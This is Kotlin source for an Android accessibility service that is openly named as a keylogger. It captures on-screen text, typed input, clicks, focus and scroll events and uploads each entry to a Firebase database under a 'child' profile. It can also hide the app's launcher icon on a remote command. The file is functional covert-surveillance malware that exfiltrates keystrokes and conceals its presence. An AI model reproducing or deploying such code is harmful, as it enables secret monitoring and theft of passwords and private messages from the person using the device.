package com.sm.sdt.firebasekeyloggerandroird.service

import android.accessibilityservice.AccessibilityService
import android.content.ComponentName
import android.content.pm.PackageManager
import android.util.Log
import android.util.Log.i
import android.view.accessibility.AccessibilityEvent
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.ValueEventListener
import com.sm.sdt.firebasekeyloggerandroird.ConstFun.getDateTime
import com.sm.sdt.firebasekeyloggerandroird.Consts
import com.sm.sdt.firebasekeyloggerandroird.Consts.CHILD_NAME_KEY
import com.sm.sdt.firebasekeyloggerandroird.Consts.KEYLOG_DATA
import com.sm.sdt.firebasekeyloggerandroird.Consts.PREFERENCE_NAME
import com.sm.sdt.firebasekeyloggerandroird.Consts.TAG
import com.sm.sdt.firebasekeyloggerandroird.Consts.USER_REFRENCE
import com.sm.sdt.firebasekeyloggerandroird.Consts.firebaseAuth
import com.sm.sdt.firebasekeyloggerandroird.Consts.firebaseDatabase
import com.sm.sdt.firebasekeyloggerandroird.ui.MainActivity

class keyloggerService : AccessibilityService() {


    lateinit var childName: String
    lateinit var keyLogDataRef: DatabaseReference


    override fun onCreate() {
        super.onCreate()

        val sharedPreferences =
            applicationContext.getSharedPreferences(PREFERENCE_NAME, MODE_PRIVATE)
        childName = sharedPreferences.getString(CHILD_NAME_KEY, "").toString()
        i(TAG, childName)
        keyLogDataRef = firebaseDatabase.getReference("users").child(firebaseAuth.uid.toString())
            .child(childName).child(KEYLOG_DATA)


        var parentUid = ""
        if (firebaseAuth.currentUser != null) {
            parentUid = firebaseAuth.currentUser!!.uid
        }
        val childName = sharedPreferences?.getString(CHILD_NAME_KEY, "")
        val userRef = firebaseDatabase.getReference(USER_REFRENCE)



        userRef.child(parentUid).child(childName.toString()).child(
            Consts.ACCOUNT_DATA
        ).child(Consts.IS_HIDDEN).addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val pkg: PackageManager = applicationContext.packageManager
                if (snapshot.value == 1) {

                    pkg.setComponentEnabledSetting(
                        ComponentName(applicationContext, MainActivity::class.java),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                    )
                } else {
                    pkg.setComponentEnabledSetting(
                        ComponentName(applicationContext, MainActivity::class.java),
                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        PackageManager.DONT_KILL_APP
                    )
                }
            }

            override fun onCancelled(error: DatabaseError) {
                TODO("Not yet implemented")
            }

        })


    }


    override fun onServiceConnected() {
        i(TAG, "onServiceConnected: Keylogger Activated")
    }


    override fun onAccessibilityEvent(event: AccessibilityEvent?) {

        when (event!!.eventType) {


            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val data = event.text.toString()
                i(TAG, "${getDateTime()} |(TEXT)| $data")
                keyLogDataRef.push().child("keylog").setValue("${getDateTime()} |(TEXT)| $data")
            }
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                val data = event.text.toString()
                i(TAG, "${getDateTime()} |(FOCUSED)| $data")
                keyLogDataRef.push().child("keylog").setValue("${getDateTime()} |(FOCUSED)| $data")
            }

            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val data = event.text.toString()
                i(TAG, "${getDateTime()} |(CLICKED)| $data")
                keyLogDataRef.push().child("keylog").setValue("${getDateTime()} |(CLICKED)| $data")
            }

            AccessibilityEvent.TYPE_VIEW_SCROLLED -> {
                val data = event.text.toString()
                if (data != "[]") {
                    i(TAG, "${getDateTime()} |(SCROLLED)| $data")
                    keyLogDataRef.push().child("keylog")
                        .setValue("${getDateTime()} |(SCROLLED)| $data")
                }

            }

            AccessibilityEvent.TYPE_ASSIST_READING_CONTEXT -> {
                val data = event.text.toString()
                i(TAG, "${getDateTime()} |(TYPE_ASSIST_READING_CONTEXT)| $data")
                keyLogDataRef.push().child("keylog")
                    .setValue("${getDateTime()} |(READING_CONTEXT)| $data")
            }


            AccessibilityEvent.TYPE_VIEW_CONTEXT_CLICKED -> {
                val data = event.text.toString()
                i(TAG, "${getDateTime()} |(CONTEXT_CLICKED)| $data")
                keyLogDataRef.push().child("keylog")
                    .setValue("${getDateTime()} |(CONTEXT_CLICKED)| $data")
            }
        }
    }

    override fun onInterrupt() {
        Log.i(TAG, "onInterrupt: Keylogger interrupted")
    }


}